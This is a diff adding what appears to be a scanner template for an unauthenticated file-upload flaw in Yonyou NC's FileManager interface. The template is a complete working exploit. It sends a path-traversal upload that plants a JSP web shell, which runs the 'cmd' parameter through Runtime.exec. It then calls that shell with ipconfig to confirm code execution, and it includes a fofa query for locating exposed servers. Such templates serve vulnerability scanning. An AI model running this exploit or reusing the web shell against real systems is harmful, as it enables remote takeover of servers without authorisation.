@@ -1,0 +1,41 @@
+http:
+    - raw:
+        - |
+          POST /portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+          Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305
+
+          --d0b7a0d40eed0e32904c8017b09eb305
+          Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
+          Content-Type: text/plain
+
+          <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+          --d0b7a0d40eed0e32904c8017b09eb305--
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - Windows IP
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /{{username}}.jsp?cmd=ipconfig HTTP/1.1
+          Host: {{Hostname}}
+id: yongyouNC-FileManager-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: icon_hash="1085941792"
+        用友 NC nc.uap.lfw.file.FileManager 接口处存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。
+    name: 用友 NC FileManager 文件上传
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486621&idx=1&sn=3089ccedabdffec2ea30d32190501c79&chksm=c267b9aef51030b89ce282109092e9d0c8e681cccc643e5a6723c5814617eeb53600df293984&token=522460222&lang=zh_CN#rd
+    severity: high
+    tags:
+        - Servlet
+variables:
+    username: '{{to_lower(rand_base(6))}}'
